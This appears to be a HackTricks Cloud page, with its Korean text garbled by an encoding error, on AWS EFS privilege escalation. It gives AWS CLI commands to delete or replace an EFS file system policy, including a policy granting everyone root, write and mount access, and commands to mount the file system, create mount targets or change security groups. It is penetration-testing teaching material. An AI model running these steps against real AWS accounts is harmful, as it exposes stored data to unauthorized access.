# AWS - EFS Privesc

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

## EFS

EFSì— ëŒ€í•œ **ë” ë§ì€ ì •ë³´**ëŠ” ë‹¤ìŒì—ì„œ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../aws-services/aws-efs-enum.md" %}
[aws-efs-enum.md](../aws-services/aws-efs-enum.md)
{% endcontent-ref %}

EFSë¥¼ ë§ˆìš´íŠ¸í•˜ë ¤ë©´ EFSê°€ ë…¸ì¶œëœ ì„œë¸Œë„¤íŠ¸ì›Œí¬ì— ìˆì–´ì•¼ í•˜ë©° ì´ì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤(ë³´ì•ˆ ê·¸ë£¹). ì´ëŸ¬í•œ ì¡°ê±´ì´ ì¶©ì¡±ë˜ë©´ ê¸°ë³¸ì ìœ¼ë¡œ í•­ìƒ ë§ˆìš´íŠ¸í•  ìˆ˜ ìˆì§€ë§Œ, IAM ì •ì±…ìœ¼ë¡œ ë³´í˜¸ë˜ëŠ” ê²½ìš° ì—¬ê¸° ì–¸ê¸‰ëœ ì¶”ê°€ ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤.

### `elasticfilesystem:DeleteFileSystemPolicy`|`elasticfilesystem:PutFileSystemPolicy`

ì´ ê¶Œí•œ ì¤‘ í•˜ë‚˜ë¡œ ê³µê²©ìëŠ” **íŒŒì¼ ì‹œìŠ¤í…œ ì •ì±…ì„ ë³€ê²½**í•˜ì—¬ **ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬**í•˜ê±°ë‚˜ **ì‚­ì œ**í•˜ì—¬ **ê¸°ë³¸ ì ‘ê·¼**ì´ í—ˆìš©ë˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì •ì±…ì„ ì‚­ì œí•˜ë ¤ë©´:
```bash
aws efs delete-file-system-policy \
--file-system-id <value>
```
ë³€ê²½í•˜ë ¤ë©´:
```json
aws efs put-file-system-policy --file-system-id <fs-id> --policy file:///tmp/policy.json

// Give everyone trying to mount it read, write and root access
// policy.json:
{
"Version": "2012-10-17",
"Id": "efs-policy-wizard-059944c6-35e7-4ba0-8e40-6f05302d5763",
"Statement": [
{
"Sid": "efs-statement-2161b2bd-7c59-49d7-9fee-6ea8903e6603",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"elasticfilesystem:ClientRootAccess",
"elasticfilesystem:ClientWrite",
"elasticfilesystem:ClientMount"
],
"Condition": {
"Bool": {
"elasticfilesystem:AccessedViaMountTarget": "true"
}
}
}
]
}
```
### `elasticfilesystem:ClientMount|(elasticfilesystem:ClientRootAccess)|(elasticfilesystem:ClientWrite)`

ì´ ê¶Œí•œì„ í†µí•´ ê³µê²©ìëŠ” **EFSë¥¼ ë§ˆìš´íŠ¸**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. EFSë¥¼ ë§ˆìš´íŠ¸í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì‚¬ìš©ìì—ê²Œ ê¸°ë³¸ì ìœ¼ë¡œ ì“°ê¸° ê¶Œí•œì´ ë¶€ì—¬ë˜ì§€ ì•ŠëŠ” ê²½ìš°, ê·¸ëŠ” **ì½ê¸° ì ‘ê·¼**ë§Œ ê°€ì§ˆ ê²ƒì…ë‹ˆë‹¤.
```bash
sudo mkdir /efs
sudo mount -t efs -o tls,iam  <file-system-id/EFS DNS name>:/ /efs/
```
The extra permissions `elasticfilesystem:ClientRootAccess` and `elasticfilesystem:ClientWrite` can be used to **write** inside the filesystem after it's mounted and to **access** that file system **as root**.

**Potential Impact:** Indirect privesc by locating sensitive information in the file system.

### `elasticfilesystem:CreateMountTarget`

ê³µê²©ìê°€ EFSì˜ **ë§ˆìš´íŠ¸ íƒ€ê²Ÿ**ì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” **ì„œë¸Œë„¤íŠ¸ì›Œí¬**ì— ìˆëŠ” ê²½ìš°, ì´ ê¶Œí•œìœ¼ë¡œ **ìì‹ ì˜ ì„œë¸Œë„·ì— í•˜ë‚˜ë¥¼ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
# You need to indicate security groups that will grant the user access to port 2049
aws efs create-mount-target --file-system-id <fs-id> \
--subnet-id <value> \
--security-groups <value>
```
**ì ì¬ì  ì˜í–¥:** íŒŒì¼ ì‹œìŠ¤í…œì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì°¾ì•„ ê°„ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

### `elasticfilesystem:ModifyMountTargetSecurityGroups`

ê³µê²©ìê°€ EFSê°€ ìì‹ ì˜ ì„œë¸Œë„¤íŠ¸ì›Œí¬ì— ë§ˆìš´íŠ¸ ëŒ€ìƒì„ ê°€ì§€ê³  ìˆì§€ë§Œ **íŠ¸ë˜í”½ì„ í—ˆìš©í•˜ëŠ” ë³´ì•ˆ ê·¸ë£¹ì´ ì—†ëŠ”** ìƒí™©ì„ ë°œê²¬í•˜ë©´, ê·¸ëŠ” **ì„ íƒí•œ ë³´ì•ˆ ê·¸ë£¹ì„ ìˆ˜ì •í•˜ì—¬ ì´ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**:
```bash
aws efs modify-mount-target-security-groups \
--mount-target-id <value> \
--security-groups <value>
```
**ì ì¬ì  ì˜í–¥:** íŒŒì¼ ì‹œìŠ¤í…œì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì°¾ì•„ ê°„ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
